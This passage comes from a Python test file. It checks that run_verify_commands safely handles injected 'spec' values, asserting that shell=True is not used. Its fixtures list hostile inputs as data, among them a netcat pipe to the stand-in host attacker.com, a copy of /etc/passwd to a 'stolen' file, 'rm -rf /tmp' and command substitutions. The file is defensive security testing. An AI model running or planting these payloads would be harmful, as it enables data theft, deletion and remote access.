                assert spec in rendered_command, \
                    f"Special characters not preserved for: {description}"

    def test_run_verify_commands_unicode_characters(self) -> None:
        """
        Test that Unicode characters in spec are handled correctly.

        This test verifies that various Unicode characters, including
        international characters, emojis, and special Unicode symbols,
        are properly handled without causing encoding issues or
        unexpected behavior.

        Unicode categories tested:
        - Latin extended characters
        - Cyrillic characters
        - Chinese/Japanese/Korean characters
        - Arabic characters
        - Emoji
        - Right-to-left text
        - Zero-width characters
        - Unicode control characters
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        unicode_specs = [
            ("spéc-chäräçtërs", "Latin extended characters with accents"),
            ("спец-имя", "Cyrillic characters"),
            ("スペック", "Japanese Hiragana/Katakana"),
            ("规格", "Chinese characters"),
            ("مواصفات", "Arabic characters"),
            ("spec-😀-test", "Emoji characters"),
            ("spec-🎉-test", "Party emoji"),
            ("spec-💀-test", "Skull emoji"),
            ("spec-test\u200b", "Zero-width space"),
            ("spec-test\u200c", "Zero-width non-joiner"),
            ("spec-test\u200d", "Zero-width joiner"),
            ("spec-test\u202e", "Right-to-left override"),
            ("spec-test\u202a", "Left-to-right embedding"),
            ("spëc-cäsë", "Multiple Unicode characters"),
            ("spec-α-β-γ", "Greek letters"),
            ("spec-עברית", "Hebrew characters"),
            ("spec-한국어", "Korean characters"),
            ("spec-ไทย", "Thai characters"),
            ("spec-†-‡-§", "Typography symbols"),
        ]

        for spec, description in unicode_specs:
            with patch("subprocess.run", return_value=mock_proc) as mock_run:
                result = run_verify_commands(["pytest {spec}"], spec)

                # Verify the command was executed without errors
                assert mock_run.called, f"Command not executed for: {description}"
                assert result.commands_run == 1, f"Result length incorrect for: {description}"

                # Verify the spec is present in the rendered command
                rendered_command = result.results[0].command
                assert spec in rendered_command, \
                    f"Unicode characters not preserved for: {description}"

    def test_run_verify_commands_path_traversal_attempts(self) -> None:
        """
        Test that path traversal attempts in spec are handled safely.

        This test verifies that various path traversal patterns are
        now safely handled after the security fix.

        SECURITY FIX: This test now verifies that shell=True is NOT used,
        preventing command execution through path traversal patterns.

        Path traversal patterns tested:
        - Parent directory references (..)
        - Current directory references (.)
        - Absolute paths
        - Windows paths
        - Encoded traversal attempts
        - Mixed traversal patterns
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        path_traversal_specs = [
            ("../etc/passwd", "Parent directory traversal"),
            ("../../etc/passwd", "Multiple parent directory traversals"),
            ("../../../etc/passwd", "Deep parent directory traversal"),
            ("./hidden", "Current directory reference"),
            (".././etc", "Mixed parent and current directory"),
            ("/etc/passwd", "Absolute path"),
            ("/absolute/path/to/file", "Absolute path to file"),
            ("..-..-etc", "Encoded parent directory with dashes"),
            ("C:\\Windows\\System32", "Windows absolute path"),
            ("C:/Windows/System32", "Windows path with forward slash"),
            ("D:\\path\\to\\file", "Windows drive letter path"),
            ("path\\with\\backslash", "Path with backslash separator"),
            ("/../etc", "Absolute path with traversal"),
            ("..\\../etc", "Mixed separator traversal"),
            ("../path/./etc", "Mixed traversal patterns"),
            (".../test", "Multiple dots (contains ..)"),
            ("....test", "Multiple dots (contains ..)"),
            ("./test/../etc", "Current directory with traversal"),
            ("../test/../etc", "Multiple parent directory references"),
        ]

        for spec, description in path_traversal_specs:
            with patch("subprocess.run", return_value=mock_proc) as mock_run:
                result = run_verify_commands(["pytest {spec}"], spec)

                # Verify the command was executed
                assert mock_run.called, f"Command not executed for: {description}"
                call_kwargs = mock_run.call_args[1]

                # SECURITY FIX: shell=True should NOT be used (command injection fixed)
                assert call_kwargs.get("shell") is not True, \
                    f"shell=True should not be used for: {description}"

                # Verify the path traversal pattern is present in the rendered command
                # (They are now safely escaped/contained by shlex.split())
                rendered_command = result.results[0].command
                assert spec in rendered_command, \
                    f"Path traversal pattern not preserved for: {description}"

    def test_run_verify_commands_null_byte_injection(self) -> None:
        """
        Test that null byte injection attempts are handled.

        Null bytes can be used to bypass string validation or terminate
        strings early, potentially leading to security vulnerabilities.
        This test verifies that null bytes in the spec parameter are
        present in the rendered command.
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        null_byte_specs = [
            ("spec\x00null", "Null byte in middle"),
            ("\x00spec", "Null byte at start"),
            ("spec\x00", "Null byte at end"),
            ("spec\x00\x00test", "Multiple null bytes"),
            ("\x00", "Pure null byte"),
            ("spec\x00; malicious", "Null byte before command injection"),
        ]

        for spec, description in null_byte_specs:
            with patch("subprocess.run", return_value=mock_proc) as mock_run:
                result = run_verify_commands(["pytest {spec}"], spec)

                # Verify the command was executed
                assert mock_run.called, f"Command not executed for: {description}"
                assert result.commands_run == 1, f"Result length incorrect for: {description}"

                # Verify the null byte is present in the rendered command
                rendered_command = result.results[0].command
                assert "\x00" in rendered_command, \
                    f"Null byte not preserved for: {description}"

    def test_run_verify_commands_format_string_injection(self) -> None:
        """
        Test that format string injection attempts are handled.

        While the current implementation uses simple string replacement
        (not str.format()), this test verifies that attempts to inject
        format strings are handled correctly.
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        format_string_specs = [
            ("{spec}", "Recursive placeholder"),
            ("{{spec}}", "Escaped placeholder"),
            ("{0}", "Positional format placeholder"),
            ("{name}", "Named format placeholder"),
            ("%.1f", "Printf-style format"),
            ("%s", "Printf-style string format"),
            ("%x", "Printf-style hex format"),
        ]

        for spec, description in format_string_specs:
            with patch("subprocess.run", return_value=mock_proc):
                result = run_verify_commands(["pytest {spec}"], spec)

                # The placeholder should be replaced
                rendered_command = result.results[0].command
                # After replacement, the spec should be in the command
                # (though format strings might cause unexpected behavior)
                assert result.commands_run == 1, f"Result length incorrect for: {description}"

    def test_run_verify_commands_long_input(self) -> None:
        """
        Test that very long spec values are handled correctly.

        Long input strings could potentially cause buffer overflows,
        performance issues, or other problems. This test verifies that
        long inputs are processed without errors.
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        # Test various long input scenarios
        long_specs = [
            ("a" * 1000, "1000 character string"),
            ("a" * 10000, "10000 character string"),
            ("a" * 100000, "100000 character string"),
            ("../" * 100, "100 parent directory traversals"),
            ("a" * 100 + ";" + "b" * 100, "Long string with injection"),
            ("😀" * 100, "100 emoji characters"),
            ("spec-" + "-".join([f"test{i}" for i in range(100)]), "Many dashed components"),
        ]

        for spec, description in long_specs:
            with patch("subprocess.run", return_value=mock_proc) as mock_run:
                result = run_verify_commands(["pytest {spec}"], spec)

                # Verify the command was executed
                assert mock_run.called, f"Command not executed for: {description}"
                assert result.commands_run == 1, f"Result length incorrect for: {description}"

                # Verify the long spec is present in the rendered command
                rendered_command = result.results[0].command
                assert spec in rendered_command, \
                    f"Long spec not preserved for: {description}"

    def test_run_verify_commands_whitespace_variations(self) -> None:
        """
        Test that various whitespace patterns are handled correctly.

        Whitespace variations can sometimes be used to bypass validation
        or cause unexpected command parsing behavior.
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        whitespace_specs = [
            ("spec test", "Single space"),
            ("spec  test", "Double space"),
            ("spec   test", "Multiple spaces"),
            ("spec\ttest", "Tab character"),
            ("spec\ntest", "Newline character"),
            ("spec\rtest", "Carriage return"),
            ("spec\r\ntest", "Carriage return + newline"),
            (" spec", "Leading space"),
            ("spec ", "Trailing space"),
            (" spec ", "Leading and trailing spaces"),
            ("spec\t\n\rtest", "Multiple whitespace types"),
            ("spec \t test", "Mixed space and tab"),
            ("  \t\nspec\t\n  ", "Whitespace on both sides"),
        ]

        for spec, description in whitespace_specs:
            with patch("subprocess.run", return_value=mock_proc) as mock_run:
                result = run_verify_commands(["pytest {spec}"], spec)

                # Verify the command was executed
                assert mock_run.called, f"Command not executed for: {description}"
                assert result.commands_run == 1, f"Result length incorrect for: {description}"

                # Verify the whitespace is preserved in the rendered command
                rendered_command = result.results[0].command
                assert spec in rendered_command, \
                    f"Whitespace not preserved for: {description}"

    def test_run_verify_commands_quote_variations(self) -> None:
        """
        Test that various quote patterns are handled correctly.

        Quotes can be used to break out of command arguments and inject
        arbitrary commands.

        SECURITY FIX: This test now verifies that malformed quotes are
        properly rejected by shlex.split(), which raises InvalidCommandError.
        This is the correct secure behavior - it prevents command injection
        through unclosed quotes.

        Valid quotes should be preserved and executed safely without shell=True.
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        # Malformed quotes that should raise InvalidCommandError
        # Note: shlex.split() is lenient - it treats quotes as word delimiters
        # Truly malformed quotes are those that never close
        malformed_quote_specs = [
            ("spec'test", "Unclosed single quote"),
            ('spec"test', "Unclosed double quote"),
            ("spec'test\"test", "Mixed unclosed quotes (no closing)"),
            ("'spec", "Unclosed single quoted spec"),
            ("\"spec", "Unclosed double quoted spec"),
            ("spec'", "Unclosed single quote at end"),
            ('spec"', "Unclosed double quote at end"),
        ]

        # Test that malformed quotes are properly rejected
        # Note: No need to mock subprocess.run() since shlex.split() will fail first
        for spec, description in malformed_quote_specs:
            with pytest.raises(InvalidCommandError, match="Failed to parse command"):
                result = run_verify_commands(["pytest {spec}"], spec)

        # Valid quote patterns that should work (properly escaped or balanced)
        valid_quote_specs = [
            ("spec\\'test", "Escaped single quote"),
            ("spec\\\"test", "Escaped double quote"),
            ("spec'test'", "Closed single quotes"),
            ('spec"test"', "Closed double quotes"),
        ]

        for spec, description in valid_quote_specs:
            with patch("subprocess.run", return_value=mock_proc) as mock_run:
                result = run_verify_commands(["pytest {spec}"], spec)

                # Verify the command was executed
                assert mock_run.called, f"Command not executed for: {description}"
                call_kwargs = mock_run.call_args[1]

                # SECURITY FIX: shell=True should NOT be used
                assert call_kwargs.get("shell") is not True, \
                    f"shell=True should not be used for: {description}"

                assert result.commands_run == 1, f"Result length incorrect for: {description}"

                # Verify the quotes are preserved in the rendered command
                rendered_command = result.results[0].command
                assert spec in rendered_command, \
                    f"Quotes not preserved for: {description}"

    def test_run_verify_commands_combined_attacks(self) -> None:
        """
        Test that combined attack patterns are handled safely.

        This test verifies that combinations of multiple attack vectors
        (e.g., path traversal + command injection, Unicode + special characters)
        are now safely handled after the security fix.

        SECURITY FIX: This test now verifies that shell=True is NOT used,
        preventing command execution through combined attack patterns.
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        combined_attack_specs = [
            ("../etc; rm -rf /tmp", "Path traversal + command chaining"),
            ("spec; cd /etc; cat passwd", "Command chaining with multiple commands"),
            ("spec && cat /etc/passwd > /tmp/stolen", "AND operator + data exfiltration"),
            ("spec | nc attacker.com 4444", "Pipe + reverse shell"),
            ("spec$(whoami); malicious", "Command substitution + injection"),
            ("spec`id` && malicious", "Backtick substitution + AND operator"),
            ("spéc; rm -rf /tmp", "Unicode + command chaining"),
            ("spec\x00; malicious", "Null byte + command injection"),
            ("../\nmalicious", "Path traversal + newline separator"),
            ("spec; touch /tmp/pwned # &&", "Command chaining + comment"),
        ]

        for spec, description in combined_attack_specs:
            with patch("subprocess.run", return_value=mock_proc) as mock_run:
                result = run_verify_commands(["pytest {spec}"], spec)

                # Verify the command was executed
                assert mock_run.called, f"Command not executed for: {description}"
                call_kwargs = mock_run.call_args[1]

                # SECURITY FIX: shell=True should NOT be used (command injection fixed)
                assert call_kwargs.get("shell") is not True, \
                    f"shell=True should not be used for: {description}"

                # Verify the combined attack is present in the rendered command
                # (They are now safely escaped/contained by shlex.split())
                rendered_command = result.results[0].command
                assert spec in rendered_command, \
                    f"Combined attack not preserved for: {description}"

    def test_run_verify_commands_edge_case_combinations(self) -> None:
        """
        Test additional edge case combinations.

        This test covers miscellaneous edge cases and unusual input
        patterns that might not fit into other categories.
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        edge_case_specs = [
            ("", "Empty string"),
            ("-", "Single dash"),
            ("--", "Double dash"),
            ("...", "Three dots (contains ..)"),
            ("....", "Four dots (contains ..)"),
            ("-", "Single dash"),
            ("_", "Single underscore"),
            (".", "Single dot"),
            (" ", "Single space"),
            ("spec\n", "Trailing newline"),
            ("\nspec", "Leading newline"),
            ("spec\r\n", "Trailing CRLF"),
            ("---", "Multiple dashes"),
            ("___", "Multiple underscores"),
            ("...", "Multiple dots"),
            ("   ", "Multiple spaces"),
            ("spec-.-test", "Dash-dot-dash pattern"),
            ("spec_.-test", "Underscore-dot-dash pattern"),
            ("-.-", "Dash-dot-dash only"),
            ("_.-._", "Underscore combinations"),
            ("spec!test", "Exclamation mark"),
            ("spec@test", "At sign"),
            ("spec#test", "Hash sign"),
            ("spec$test", "Dollar sign"),
            ("spec%test", "Percent sign"),
            ("spec&test", "Ampersand"),
            ("spec*test", "Asterisk"),
            ("spec?test", "Question mark"),
        ]

        for spec, description in edge_case_specs:
            with patch("subprocess.run", return_value=mock_proc) as mock_run:
                result = run_verify_commands(["pytest {spec}"], spec)

                # Verify the command was executed
                assert mock_run.called, f"Command not executed for: {description}"
                assert result.commands_run == 1, f"Result length incorrect for: {description}"

                # Verify the spec is present in the rendered command
                rendered_command = result.results[0].command
                assert spec in rendered_command, \
                    f"Edge case not preserved for: {description}"
